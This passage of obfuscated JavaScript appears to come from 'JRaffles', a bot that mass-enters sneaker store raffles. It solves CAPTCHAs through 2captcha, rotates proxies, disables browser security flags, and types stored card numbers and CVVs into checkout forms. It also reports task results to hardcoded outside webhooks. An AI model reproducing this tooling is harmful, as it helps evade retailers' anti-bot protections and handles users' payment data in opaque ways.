                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x7eeabb));
                            }
                        } catch (_0x48c1a9) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20' + _0x48c1a9));
                        } finally {
                            _0x37768c && _0x37768c['close']();
                            if (_0x27bafe == 'yes' && _0x3aae40 != 0x5) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x14da30['name'] + ']\x20Task\x20' + (_0x424d77 + 0x1) + '\x20:\x20Retrying')), _0x424d77 = _0x424d77 - 0x1, _0x3aae40 = _0x3aae40 + 0x1;
                                continue;
                            }
                            _0x27bafe == 'yes' && _0x3aae40 >= 0x5 && (_0xc8d9fd(_0x4727cf[_0x424d77], _0x14da30), _0x27bafe = 'no', _0x3aae40 = 0x0), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x56881e, _0x553c68, _0xd74b80) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x40a156 = 0x0; _0x40a156 < _0x553c68['length']; _0x40a156++) {
                        var _0x81b1fe;
                        if (_0x527e9a != 'yes')
                            var _0x527e9a = '', _0x468b65 = 0x0;
                        _0x1f02d2(_0x56881e['name'] + '\x20Task\x20' + (_0x40a156 + 0x1) + '\x20/\x20' + _0x553c68['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x553c68, _0x40a156);
                        if (_0x553c68[_0x40a156]['Email'] == '' || _0x553c68[_0x40a156]['Password'] == '' || _0x553c68[_0x40a156]['FirstName'] == '' || _0x553c68[_0x40a156]['LastName'] == '') {
                            console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x9a51aa['useRandomProxy'] = ![])
                            var _0x51c52d = _0xd74b80[_0x40a156]['split'](':');
                        else
                            var _0x3ee1d7 = Math['round'](Math['random']() * (_0xd74b80['length'] - 0x1)), _0x51c52d = _0xd74b80[_0x3ee1d7]['split'](':');
                        const _0x38642c = await _0x6d7b51['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x51c52d[0x0] + ':' + _0x51c52d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x4ff954 = await _0x38642c['newPage']();
                            await _0x4ff954['authenticate']({
                                'username': '' + _0x51c52d[0x2],
                                'password': '' + _0x51c52d[0x3]
                            }), await _0x4ff954['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ff954['setRequestInterception'](!![]), _0x4ff954['on']('request', _0xec10dc => {
                                _0xec10dc['resourceType']() === 'image' || _0xec10dc['resourceType']() === 'font' || _0xec10dc['resourceType']() === 'media' ? _0xec10dc['abort']() : _0xec10dc['continue']();
                            }), await _0x4ff954['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4ff954['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4ff954['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xbbd9dc(0x258), await _0x4ff954['waitForSelector']('#CustomerEmail'), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4ff954['type']('#CustomerEmail', '' + _0x553c68[_0x40a156]['Email']), await _0xbbd9dc(0x12c), await _0x4ff954['type']('#CustomerPassword', '' + _0x553c68[_0x40a156]['Password']), await _0xbbd9dc(0x226), await _0x4ff954['$eval']('#customer_login', _0x523086 => _0x523086['submit']()), await _0xbbd9dc(0x7d0), await _0x4ff954['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20' + _0x19e6c5['cyan']('Solving\x20Captcha')), await _0x4ff954['solveRecaptchas'](), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4ff954['$eval']('.shopify-challenge__container\x20>\x20form', _0x35e261 => _0x35e261['submit']());
                            try {
                                await _0x4ff954['waitForSelector']('.nav-account'), await _0xbbd9dc(0x4b0);
                            } catch {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4ff954['goto']('' + _0x553c68[_0x40a156]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xbbd9dc(0xbb8), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4ff954['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x4ff954['click']('.product-select-variant-wrapper'), await _0xbbd9dc(0x320), await _0x4ff954['click']('li.product-select-variant__value[data-size=\x22' + _0x553c68[_0x40a156]['Size'] + '\x22]'), await _0xbbd9dc(0x384), await _0x4ff954['$eval']('#AddToCartForm-product-template-raffle', _0xc462f1 => _0xc462f1['submit']()), await _0x4ff954['waitForSelector']('.cart-order-summary__content'), await _0xbbd9dc(0x514), await _0x4ff954['goto']('https://drop.slamjam.com/checkout'), await _0xbbd9dc(0x514), await _0x4ff954['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4ff954['select']('#checkout_shipping_address_country', '' + _0x553c68[_0x40a156]['Country']), await _0xbbd9dc(0x200), await _0x4ff954['waitForSelector']('#checkout_shipping_address_first_name'), await _0x4ff954['type']('#checkout_shipping_address_first_name', '' + _0x553c68[_0x40a156]['FirstName']), await _0xbbd9dc(0x237), await _0x4ff954['type']('#checkout_shipping_address_last_name', '' + _0x553c68[_0x40a156]['LastName']), await _0xbbd9dc(0x1e0), await _0x4ff954['type']('#checkout_shipping_address_address1', _0x553c68[_0x40a156]['Address1'] + '\x20' + _0x553c68[_0x40a156]['HouseNumber']), await _0xbbd9dc(0x514), await _0x4ff954['type']('#checkout_shipping_address_address2', '' + _0x553c68[_0x40a156]['Address2']), await _0xbbd9dc(0x514);
                            _0x553c68[_0x40a156]['Postcode'] == undefined && (_0x553c68[_0x40a156]['Postcode'] = _0x553c68[_0x40a156]['Zip']);
                            await _0x4ff954['type']('#checkout_shipping_address_zip', '' + _0x553c68[_0x40a156]['Postcode']), await _0xbbd9dc(0x2bc), await _0x4ff954['type']('#checkout_shipping_address_city', '' + _0x553c68[_0x40a156]['City']), await _0xbbd9dc(0x320), await _0x4ff954['type']('#checkout_shipping_address_phone', '' + _0x553c68[_0x40a156]['Phone']), await _0xbbd9dc(0x320), await _0x4ff954['click']('#continue_button'), await _0xbbd9dc(0xbb8), await _0x4ff954['waitForSelector']('.summary-title'), await _0xbbd9dc(0x320), await _0x4ff954['click']('#continue_button'), await _0xbbd9dc(0x320), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x4ff954['waitForSelector']('#checkout_credit_card_vault'), await _0xbbd9dc(0x3e8);
                            var _0x325655 = await _0x4ff954['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x342aaa = await _0x325655['contentFrame']();
                            await _0x342aaa['click']('#number'), await _0xbbd9dc(0x3e8), await _0x342aaa['type']('#number', '' + _0x553c68[_0x40a156]['CardNumber'], { 'delay': 0x78 }), _0x325655 = await _0x4ff954['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x342aaa = await _0x325655['contentFrame'](), await _0xbbd9dc(0x1c2), await _0x342aaa['click']('#name'), await _0xbbd9dc(0x1f4), await _0x342aaa['type']('#name', '' + _0x553c68[_0x40a156]['NameOnCard'], { 'delay': 0x78 }), _0x325655 = await _0x4ff954['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x342aaa = await _0x325655['contentFrame'](), await _0xbbd9dc(0x1c2), await _0x342aaa['click']('#expiry'), await _0xbbd9dc(0x1f4), await _0x342aaa['type']('#expiry', '' + _0x553c68[_0x40a156]['ExpiryDate'], { 'delay': 0x78 }), _0x325655 = await _0x4ff954['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x342aaa = await _0x325655['contentFrame'](), await _0xbbd9dc(0x1c2), await _0x342aaa['click']('#verification_value'), await _0xbbd9dc(0x1f4), await _0x342aaa['type']('#verification_value', '' + _0x553c68[_0x40a156]['CVV'], { 'delay': 0x78 }), await _0x4ff954['$eval']('#accepts-flag-raffle', _0x52e889 => _0x52e889['click']()), await _0xbbd9dc(0x7d0), console['log'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x4ff954['$eval']('#continue_button', _0x210a6e => _0x210a6e['click']()), await _0xbbd9dc(0x1b58), await _0x4ff954['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x4ff954['$eval']('.edit_checkout.animate-floating-labels', _0x20cd51 => _0x20cd51['submit']()), await _0xbbd9dc(0x7d0);
                            try {
                                await _0x4ff954['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x527e9a = 'no', _0x5d1d0f(_0x553c68[_0x40a156], _0x56881e), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2977b0) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2977b0['message']);
                            }
                            var _0x2e3312 = await _0x23dc1b(_0x553c68[_0x40a156], _0x56881e, 'dev', ![]), _0x212c95 = await _0x23dc1b(_0x553c68[_0x40a156], _0x56881e, 'pub', ![]);
                            const _0x44819c = {
                                'succesDEVMSG': { 'embeds': [_0x2e3312] },
                                'succesPUBMSG': { 'embeds': [_0x212c95] }
                            };
                            try {
                                _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x44819c['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x44819c['succesDEVMSG']), await _0xbbd9dc(0xc8), await _0x4236dd(_0x4d6262, _0x44819c['succesPUBMSG']);
                            } catch (_0x2036bf) {
                                console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2036bf));
                            }
                        } catch (_0x583ebe) {
                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20' + _0x583ebe)), _0x81b1fe = '' + _0x583ebe;
                            var _0x1a4fe0 = await _0x23dc1b(kickz[_0x40a156], _0x56881e, 'dev', !![], _0x81b1fe);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x1a4fe0] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], EMBEDS['errorDEV']), await _0x4236dd(_0x48c50b, EMBEDS['errorDEV']), _0x527e9a = 'yes';
                        } finally {
                            _0x38642c && _0x38642c['close']();
                            if (_0x527e9a == 'yes' && _0x468b65 != 0x5 && _0x81b1fe != 'Size\x20Not\x20Found') {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x56881e['name'] + ']\x20Task\x20' + (_0x40a156 + 0x1) + '\x20:\x20Retrying')), _0x40a156 = _0x40a156 - 0x1, _0x468b65 = _0x468b65 + 0x1;
                                continue;
                            }
                            _0x527e9a == 'yes' && _0x468b65 >= 0x5 && (_0xc8d9fd(_0x553c68[_0x40a156], _0x56881e), _0x527e9a = 'no', _0x468b65 = 0x0), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x3b5033) {
                    var _0x391dd2 = await _0x19b735(), _0x4fa58e = _0x80a504['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xc86ed8 = _0x5ea71e['parse'](_0x4fa58e, { 'header': !![] })['data'];
                    for (var _0x12e93f = 0x0; _0x12e93f < _0xc86ed8['length']; _0x12e93f++) {
                        var _0x2210bc = _0xc86ed8[_0x12e93f]['Store'], _0x1019c6 = _0xc86ed8[_0x12e93f]['Mode'];
                        for (var _0x4a368a of _0x199de3) {
                            const _0x94c983 = _0x4a368a['name']['includes'](_0x2210bc);
                            if (!_0x94c983)
                                continue;
                            for (mode of _0x4a368a['modules']) {
                                if (mode['name'] == _0x1019c6) {
                                    console['log']('Running\x20' + _0x19e6c5['cyan'](mode['name'])), await mode['function'](mode, [_0xc86ed8[_0x12e93f]], _0x391dd2);
                                    var _0x151fea = _0x4fa58e['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x80a504['writeFileSync']('../failed-tasks.csv', _0x151fea);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4d7cb6 = await _0x44753c['get']('Answer');
                    if (_0x4d7cb6['Answer']['toLowerCase']() == 'y') {
                        _0x80a504['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xbbd9dc(0x3e8);
                        return;
                    }
                    if (_0x4d7cb6['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xbbd9dc(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xbbd9dc(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x5ba7fd(_0x141421) {
    var _0x1c74b1 = await _0x19b735(), _0x1336d5 = _0x80a504['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3ef634 = _0x5ea71e['parse'](_0x1336d5, { 'header': !![] })['data'];
    for (var _0x59b278 = 0x0; _0x59b278 < _0x3ef634['length']; _0x59b278++) {
        var _0x361e3b = _0x3ef634[_0x59b278]['Store'], _0x415240 = _0x3ef634[_0x59b278]['Mode'];
        for (var _0x4c1189 of _0x199de3) {
            const _0x17a7bf = _0x4c1189['name']['includes'](_0x361e3b);
            if (_0x17a7bf)
                for (mode of _0x199de3[_0x4c1189]['modules']) {
                    const _0x1c627d = mode['name']['includes'](_0x415240);
                    _0x1c627d && (_0x141421 = mode['name'], await mode['function'](_0x141421, _0x3ef634[_0x59b278], _0x1c74b1));
                }
        }
    }
}
async function _0x59b557() {
    await _0x24fcf2(), console['clear']();
    if (_0x198625 != 'devkey') {
        let _0xe9de58 = await _0x3a0997['autoUpdate']();
        if (_0xe9de58 === 'yes')
            return _0x5a2bbf('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2d0e38 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xbbd9dc(0x2710);
        ;
    }
    await _0x2b954b(_0x2d0e38);
    if (_0x430043 === ![])
        return console['log']('Closing\x20Browser'), await _0xbbd9dc(0xbb8);
    else
        try {
            var _0x2808e1 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x213f4d
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x198625
                    }
                ]
            }];
            const _0x298fa9 = { 'embeds': _0x2808e1 };
            var _0x164d75 = await _0x23dc1b(null, null, 'open', ![]);
            const _0x5bbc36 = { 'openDEVMSG': { 'embeds': [_0x164d75] } };
            await _0x4236dd(_0x266646, _0x5bbc36['openDEVMSG']);
            async function _0x1a81a9() {
                _0x1f02d2('JRaffles\x20' + _0x198625), console['clear'](), console['log']('Welcome\x20to\x20' + _0x19e6c5['cyan']('JRaffles();') + '\x20' + _0x198625), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x41147f = 0x0; _0x41147f < _0x199de3['length'] - 0x4; _0x41147f++) {
                    if (_0x41147f >= 0xa) {
                        console['log']('\x20(' + _0x41147f + ')\x20[' + _0x199de3[_0x41147f]['name'] + ']');
                        continue;
                    }
                    if (_0x199de3[_0x41147f]['name'] === 'Reload\x20Settings' || _0x199de3[_0x41147f]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x41147f + ')\x20\x20[' + _0x199de3[_0x41147f]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x199de3['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x199de3['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x199de3['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x199de3['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x512859();
                if (taskModule > _0x199de3['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xbbd9dc(0x3e8), _0x1a81a9();
                if (_0x199de3[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                    var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x4bf95b = await _0x19b735(), _0x3c3399 = await _0x5852ae();
                        _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x3c3399), await _0x4b55ee['function'](_0x4b55ee, _0x3c3399, _0x4bf95b);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x4bf95b = await _0x19b735(), _0x3c3399 = await _0x5852ae();
                            _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x3c3399), await _0x4b55ee['function'](_0x4b55ee, _0x3c3399, _0x4bf95b);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4bf95b = await _0x19b735();
                                await _0x4b55ee['function'](_0x4b55ee, _0x18859d, _0x4bf95b);
                            }
                        }
                    }
                    return _0x1a81a9();
                }
                if (_0x199de3[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                        var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4bf95b = await _0x19b735(), _0x14ee88 = await _0x5852ae();
                            _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x14ee88), await _0x4b55ee['function'](_0x4b55ee, _0x14ee88, _0x4bf95b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4bf95b = await _0x19b735(), _0x14ee88 = await _0x5852ae();
                                _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x14ee88), await _0x4b55ee['function'](_0x4b55ee, _0x14ee88, _0x4bf95b);
                            }
                        }
                    } catch (_0x164057) {
                        console['log'](_0x164057), await _0xbbd9dc(0xfa0);
                    }
                    return _0x1a81a9();
                }
                if (_0x199de3[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                    var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x4bf95b = await _0x19b735();
                        return await _0x4b55ee['function'](_0x4b55ee, _0x4bf95b), _0x1a81a9();
                    }
                    var _0x4bf95b = await _0x19b735(), _0x159048 = await _0x5852ae();
                    return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x159048), await _0x4b55ee['function'](_0x4b55ee, _0x159048, _0x4bf95b), _0x1a81a9();
                }
                if (_0x199de3[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                    var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4bf95b = await _0x19b735(), _0x159048 = await _0x5852ae();
                    return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x159048), await _0x4b55ee['function'](_0x4b55ee, _0x159048, _0x4bf95b), _0x1a81a9();
                } else {
                    if (_0x199de3[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                        var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x4bf95b = await _0x19b735(), _0x4f9de5 = await _0x5852ae();
                            return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x4f9de5), await _0x4b55ee['function'](_0x4b55ee, _0x4f9de5, _0x4bf95b), _0x1a81a9();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4bf95b = await _0x19b735();
                                return await _0x4b55ee['function'](_0x4b55ee, _0x18859d, _0x4bf95b), _0x1a81a9();
                            }
                        }
                        ;
                    } else {
                        if (_0x199de3[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                            var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction], _0x4bf95b = await _0x19b735(), _0xfd0b5a = await _0x5852ae();
                            return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0xfd0b5a), await _0x4b55ee['function'](_0x4b55ee, _0xfd0b5a, _0x4bf95b), await _0xbbd9dc(0x1388), _0x1a81a9();
                        } else {
                            if (_0x199de3[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x4bf95b = await _0x19b735(), _0x4f9de5 = await _0x5852ae();
                                    return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x4f9de5), await _0x4b55ee['function'](_0x4b55ee, _0x4f9de5, _0x4bf95b), _0x1a81a9();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x4bf95b = await _0x19b735();
                                        return await _0x4b55ee['function'](_0x4b55ee, _0x18859d, _0x4bf95b), _0x1a81a9();
                                    }
                                }
                                ;
                            } else {
                                if (_0x199de3[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                    var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x173c01('https://bouncewear.com/nl/account/register', _0x4b55ee);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x199de3[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                        var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x4bf95b = await _0x19b735(), _0x4e45d8 = await _0x5852ae();
                                            return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x4e45d8), await _0x4b55ee['function'](_0x4b55ee, _0x4e45d8, _0x4bf95b), _0x1a81a9();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x4bf95b = await _0x19b735(), _0x4e45d8 = await _0x5852ae();
                                                return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x4e45d8), await _0x4b55ee['function'](_0x4b55ee, _0x4e45d8, _0x4bf95b), _0x1a81a9();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x199de3[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                            var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4bf95b = await _0x19b735(), _0x489d9c = await _0x5852ae();
                                                return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x489d9c), await _0x4b55ee['function'](_0x4b55ee, _0x489d9c, _0x4bf95b), _0x1a81a9();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4bf95b = await _0x19b735(), _0x489d9c = await _0x5852ae();
                                                    return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x489d9c), await _0x4b55ee['function'](_0x4b55ee, _0x489d9c, _0x4bf95b), _0x1a81a9();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x199de3[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                                var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4bf95b = await _0x19b735(), _0xa8d34f = await _0x5852ae();
                                                    return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0xa8d34f), await _0x4b55ee['function'](_0x4b55ee, _0xa8d34f, _0x4bf95b), _0x1a81a9();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4bf95b = await _0x19b735(), _0xa8d34f = await _0x5852ae();
                                                        return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0xa8d34f), await _0x4b55ee['function'](_0x4b55ee, _0xa8d34f, _0x4bf95b), _0x1a81a9();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x199de3[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                                    var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4bf95b = await _0x19b735(), _0x19ac12 = await _0x5852ae();
                                                        return _0x9a51aa['shuffleTasks'] && await _0x5a5e45(_0x19ac12), await _0x4b55ee['function'](_0x4b55ee, _0x19ac12, _0x4bf95b), _0x1a81a9();
                                                    }
                                                } else {
                                                    if (_0x199de3[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xbbd9dc(0x3e8), _0x1a81a9();
                                                    else {
                                                        if (_0x199de3[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0xa71aaa = _0x199de3[taskModule]['name'], _0x4bf95b = await _0x19b735();
                                                            const _0x2a110c = await _0x3cd2d5();
                                                            var _0x18859d = _0x2a110c['split'](';');
                                                            await _0x432efb(_0x18859d, _0xa71aaa, _0x4bf95b);
                                                        } else {
                                                            if (_0x199de3[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x424d56(_0x199de3[taskModule]['modules']);
                                                                var _0x4b55ee = _0x199de3[taskModule]['modules'][taskFunction];
                                                                return await _0x4b55ee['function'](_0x4b55ee), _0x1a81a9();
                                                            } else {
                                                                if (_0x199de3[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x58b779 = 0x0;
                                                                    for (const _0x202100 in _0x9a51aa) {
                                                                        console['log']('(' + _0x58b779 + ')\x20' + _0x202100 + '\x20:\x20' + _0x9a51aa[_0x202100]), _0x58b779++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x58b779 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x3ec9fa = await _0x487531();
